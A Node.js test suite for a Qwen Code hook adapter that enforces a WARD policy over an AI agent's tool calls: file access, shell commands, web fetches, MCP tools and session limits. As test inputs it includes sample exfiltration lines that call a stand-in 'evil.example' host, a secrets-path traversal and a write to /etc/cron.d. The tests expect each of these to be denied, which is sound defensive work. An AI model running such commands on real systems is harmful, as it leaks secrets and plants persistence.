// adapter-qwencode against Qwen Code's documented hook contract
// (https://qwenlm.github.io/qwen-code-docs/en/users/features/hooks/) and its
// tool names and parameter schemas (packages/core/src/tools).
import { test, describe } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync, spawn } from 'node:child_process';
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, existsSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { createServer } from 'node:http';
import { parseWard } from '@weave_protocol/ward';
import { evaluateCall, toHookOutput, normalizeInput } from '../dist/index.js';

const WARD = (ws) => `---
ward: "1.0"
agent: qwen-test
---

## Filesystem

allow:
  - read: ${ws}/**
  - write: ${ws}/out/**
  - list: ${ws}/**
deny:
  - read: ${ws}/secrets/**
  - list: ${ws}/secrets/**
default: deny

## Network

allow:
  - url: "https://docs.example.com/**"
  - url: "https://api.openai.com/**"
  - url: "https://api.deepseek.com/**"
deny:
  - url: "https://evil.example/**"
default: deny

## Capabilities

allow:
  - file_read
  - file_write
  - file_list
  - shell_exec
  - code_exec
  - http_request
  - task_planning
  - mcp__files__*
requireApproval:
  - web_search
default: deny
`;

const WS = '/workspace';
const policy = parseWard(WARD(WS));
const decide = (tool, input) => evaluateCall(policy, tool, input, WS).decision;

describe('built-in tools', () => {
  test('file tools use their schema argument names', () => {
    assert.equal(decide('read_file', { file_path: `${WS}/src/a.ts` }), 'allow');
    assert.equal(decide('read_file', { file_path: `${WS}/secrets/key` }), 'deny');
    assert.equal(decide('read_file', { file_path: `${WS}/out/../secrets/key` }), 'deny', 'traversal');
    assert.equal(decide('write_file', { file_path: `${WS}/out/a.md`, content: 'x' }), 'allow');
    assert.equal(decide('edit', { file_path: `${WS}/src/a.ts`, old_string: 'a', new_string: 'b' }), 'deny', 'write outside out/');
    assert.equal(decide('notebook_edit', { notebook_path: `${WS}/out/n.ipynb`, cell_id: 'c1' }), 'allow');
    assert.equal(decide('list_directory', { path: `${WS}/secrets` }), 'deny');
    assert.equal(decide('grep_search', { pattern: 'KEY', path: `${WS}/secrets` }), 'deny');
    assert.equal(decide('glob', { pattern: '**/*.ts', path: WS }), 'allow');
  });

  test('run_shell_command: every URL and path, resolved against directory', () => {
    assert.equal(decide('run_shell_command', { command: 'npm test' }), 'allow');
    assert.equal(decide('run_shell_command', { command: 'curl https://docs.example.com/a && curl https://evil.example/s' }), 'deny');
    assert.equal(decide('run_shell_command', { command: 'cat key', directory: `${WS}/secrets` }), 'deny', 'relative to directory');
  });

  test('web_fetch checks its url', () => {
    assert.equal(decide('web_fetch', { url: 'https://docs.example.com/guide', prompt: 'summarize' }), 'allow');
    assert.equal(decide('web_fetch', { url: 'https://evil.example/x', prompt: 'summarize' }), 'deny');
  });

  test('exec (code mode): its JavaScript source is scanned like a command', () => {
    assert.equal(decide('exec', { source: 'const r = await read_file({ file_path: "src/a.ts" }); text(r);' }), 'allow');
    assert.equal(decide('exec', { source: 'await fetch("https://evil.example/c?d=" + data)' }), 'deny');
  });

  test('tool_call is decided as the tool it invokes, with its arguments', () => {
    assert.deepEqual(normalizeInput('tool_call', { name: 'read_file', arguments: { file_path: '/x' } }, WS).name, 'read_file');
    assert.equal(decide('tool_call', { name: 'read_file', arguments: { file_path: `${WS}/secrets/key` } }), 'deny');
    assert.equal(decide('tool_call', { name: 'read_file', arguments: JSON.stringify({ file_path: `${WS}/src/a.ts` }) }), 'allow', 'arguments as a JSON string');
    assert.equal(decide('tool_call', { name: 'cron_create', arguments: { cron: '* * * * *', prompt: 'x' } }), 'deny', 'scheduled_task is not allowed');
  });

  test('planning tools share one capability; unknown and risky tools default to deny', () => {
    for (const t of ['todo_write', 'ask_user_question', 'enter_plan_mode', 'task_create']) assert.equal(decide(t, {}), 'allow', t);
    assert.equal(decide('web_search', { query: 'x' }), 'require_approval');
    for (const t of ['agent', 'cron_create', 'send_message', 'autofix_pr', 'some_new_tool']) assert.equal(decide(t, {}), 'deny', t);
  });

  test('MCP tools are gated by name and arguments', () => {
    assert.equal(decide('mcp__files__copy', { source: `${WS}/a`, destination: `${WS}/out/a` }), 'allow');
    assert.equal(decide('mcp__files__copy', { source: `${WS}/a`, destination: '/etc/cron.d/x' }), 'deny');
    assert.equal(decide('mcp__other__thing', {}), 'deny');
  });

  test('model_jurisdictions: a Chinese model endpoint is blocked even though the URL is allowed... unless named', () => {
    const p = parseWard(WARD(WS).replace('default: deny\n\n## Capabilities', 'model_jurisdictions:\n  deny: [cn]\ndefault: deny\n\n## Capabilities'));
    assert.equal(evaluateCall(p, 'run_shell_command', { command: 'curl https://api.moonshot.ai/v1/chat/completions' }, WS).decision, 'deny');
    assert.equal(evaluateCall(p, 'run_shell_command', { command: 'curl https://api.deepseek.com/v1/chat/completions' }, WS).decision, 'allow', 'named in an allow rule');
    assert.equal(evaluateCall(p, 'run_shell_command', { command: 'curl https://api.openai.com/v1/models' }, WS).decision, 'allow');
  });
});

test('output: deny → "deny", require_approval → "ask", allow prints nothing', () => {
  assert.deepEqual(toHookOutput({ decision: 'allow', reasons: [] }, 'W'), {});
  const deny = toHookOutput({ decision: 'deny', reasons: ['nope'] }, 'W').hookSpecificOutput;
  assert.equal(deny.hookEventName, 'PreToolUse');
  assert.equal(deny.permissionDecision, 'deny');
  assert.match(deny.permissionDecisionReason, /nope/);
  const ask = toHookOutput({ decision: 'require_approval', reasons: ['ask first'] }, 'W').hookSpecificOutput;
  assert.equal(ask.permissionDecision, 'ask');
  assert.match(ask.permissionDecisionReason, /requires approval/);
});

describe('CLI end to end (isolated HOME)', () => {
  const cli = resolve('dist/cli.js');
  const home = mkdtempSync(join(tmpdir(), 'qwen-home-'));
  const ws = mkdtempSync(join(tmpdir(), 'qwen-ws-'));
  writeFileSync(join(ws, 'WARD.md'), WARD(ws));
  const env = { PATH: process.env.PATH, HOME: home, WEAVE_LEDGER_DIR: join(home, 'ledger'), WEAVE_RECEIPTS: '0' };
  const run = (args, input, extra = {}) => spawnSync(process.execPath, [cli, ...args], { input, env: { ...env, ...extra }, encoding: 'utf8', cwd: ws });
  const hook = (payload, extra) => {
    const r = run(['hook', 'pre-tool-use'], JSON.stringify({ hook_event_name: 'PreToolUse', session_id: 's', cwd: ws, ...payload }), extra);
    assert.equal(r.status, 0, 'the hook must never exit non-zero: Qwen Code would let the call through');
    return JSON.parse(r.stdout);
  };

  test('a denied call prints a deny decision; an allowed one prints {}', () => {
    const out = hook({ tool_name: 'read_file', tool_input: { file_path: join(ws, 'secrets', 'key') } });
    assert.equal(out.hookSpecificOutput.permissionDecision, 'deny');
    assert.match(out.hookSpecificOutput.permissionDecisionReason, /secrets/);
    assert.deepEqual(hook({ tool_name: 'read_file', tool_input: { file_path: join(ws, 'src', 'a.ts') } }), {});
  });

  test('an invalid or unreadable WARD.md denies; no WARD.md allows', () => {
    const broken = mkdtempSync(join(tmpdir(), 'qwen-ws-'));
    writeFileSync(join(broken, 'WARD.md'), '# not a policy');
    const out = hook({ cwd: broken, tool_name: 'read_file', tool_input: { file_path: join(broken, 'a') } });
    assert.equal(out.hookSpecificOutput.permissionDecision, 'deny');
    assert.match(out.hookSpecificOutput.permissionDecisionReason, /could not be loaded/);
    // WEAVE_WARD_PATH pointing at a directory: reading it throws, and that still denies
    const unreadable = hook({ tool_name: 'read_file', tool_input: { file_path: join(ws, 'a') } }, { WEAVE_WARD_PATH: ws });
    assert.equal(unreadable.hookSpecificOutput.permissionDecision, 'deny');
    const none = mkdtempSync(join(tmpdir(), 'qwen-ws-'));
    assert.deepEqual(hook({ cwd: none, tool_name: 'run_shell_command', tool_input: { command: 'ls' } }), {});
  });

  test('a malformed payload allows by default and denies with --fail-closed, always exiting 0', () => {
    const open = run(['hook', 'pre-tool-use'], '{not json');
    assert.equal(open.status, 0);
    assert.equal(open.stdout, '{}');
    const closed = run(['hook', 'pre-tool-use', '--fail-closed'], '{not json');
    assert.equal(closed.status, 0);
    assert.equal(JSON.parse(closed.stdout).hookSpecificOutput.permissionDecision, 'deny');
  });

  test('init and disable edit settings.json idempotently, keeping other settings and hooks', () => {
    const settingsPath = join(home, '.qwen', 'settings.json');
    mkdirSync(join(home, '.qwen'), { recursive: true });
    writeFileSync(settingsPath, JSON.stringify({ theme: 'dark', hooks: { PreToolUse: [{ matcher: 'write_file', hooks: [{ type: 'command', name: 'mine', command: 'my-check' }] }] } }));

    assert.equal(run(['init']).status, 0);
    assert.equal(run(['init', '--fail-closed', '--timeout=15']).status, 0);
    const s = JSON.parse(readFileSync(settingsPath, 'utf8'));
    assert.equal(s.theme, 'dark');
    assert.equal(s.hooks.PreToolUse.length, 2, 'one of ours, one of theirs');
    const ours = s.hooks.PreToolUse.find((e) => e.hooks[0].name === 'weave-ward');
    assert.deepEqual(ours.hooks[0], { type: 'command', name: 'weave-ward', command: 'weave-qwen hook pre-tool-use --fail-closed', timeout: 15 });
    assert.equal(ours.matcher, '.*');
    assert.ok(existsSync(`${settingsPath}.weave-backup`));

    assert.equal(run(['status']).status, 0);
    assert.equal(run(['disable']).status, 0);
    assert.deepEqual(JSON.parse(readFileSync(settingsPath, 'utf8')).hooks.PreToolUse.map((e) => e.hooks[0].name), ['mine']);
  });

  test('test command dry-runs a call', () => {
    assert.equal(run(['test', 'read_file', `--input=${JSON.stringify({ file_path: join(ws, 'secrets', 'k') })}`]).status, 1);
    assert.equal(run(['test', 'read_file', `--input=${JSON.stringify({ file_path: join(ws, 'a') })}`]).status, 0);
  });

  test('session limits hold across hook processes, per session_id', () => {
    const lws = mkdtempSync(join(tmpdir(), 'qwen-limits-'));
    writeFileSync(join(lws, 'WARD.md'), `---\nward: "1.0"\nagent: qwen-limits\n---\n\n## Filesystem\n\nallow:\n  - read: ${lws}/**\ndefault: deny\n\n## Capabilities\n\ndefault: allow\n\n## Behavioral Limits\n\nmaxToolCalls: 2\n`);
    const call = (session) => JSON.stringify(hook({ cwd: lws, session_id: session, tool_name: 'read_file', tool_input: { file_path: join(lws, 'a.txt') } }));
    assert.doesNotMatch(call('one'), /Max tool calls/);
    assert.doesNotMatch(call('one'), /Max tool calls/);
    assert.match(call('one'), /Max tool calls/);
    assert.doesNotMatch(call('two'), /Max tool calls/, 'another session has its own count');
  });
});

test('reports the decision to the dashboard as qwen-code when WEAVE_DASHBOARD_URL is set', async () => {
  const received = [];
  const server = createServer((req, res) => { let raw = ''; req.on('data', (c) => (raw += c)); req.on('end', () => { received.push(JSON.parse(raw)); res.writeHead(201); res.end('{}'); }); });
  await new Promise((r) => server.listen(0, '127.0.0.1', r));
  try {
    const home = mkdtempSync(join(tmpdir(), 'qwen-report-'));
    const ws = mkdtempSync(join(tmpdir(), 'qwen-report-ws-'));
    writeFileSync(join(ws, 'WARD.md'), WARD(ws));
    const r = await new Promise((done) => {
      const child = spawn(process.execPath, [resolve('dist/cli.js'), 'hook', 'pre-tool-use'], {
        env: { PATH: process.env.PATH, HOME: home, WEAVE_DASHBOARD_URL: `http://127.0.0.1:${server.address().port}`, WEAVE_DASHBOARD_TIMEOUT_MS: '5000' }, cwd: ws,
      });
      let stdout = '';
      child.stdout.on('data', (d) => (stdout += d));
      child.on('close', (status) => done({ status, stdout }));
      child.stdin.end(JSON.stringify({ hook_event_name: 'PreToolUse', session_id: 's', cwd: ws, tool_name: 'read_file', tool_input: { file_path: join(ws, 'secrets', 'k') } }));
    });
    assert.equal(r.status, 0);
    assert.equal(received.length, 1);
    assert.equal(received[0].surface, 'qwen-code');
    assert.equal(received[0].decision, 'deny');
  } finally {
    server.close();
  }
});
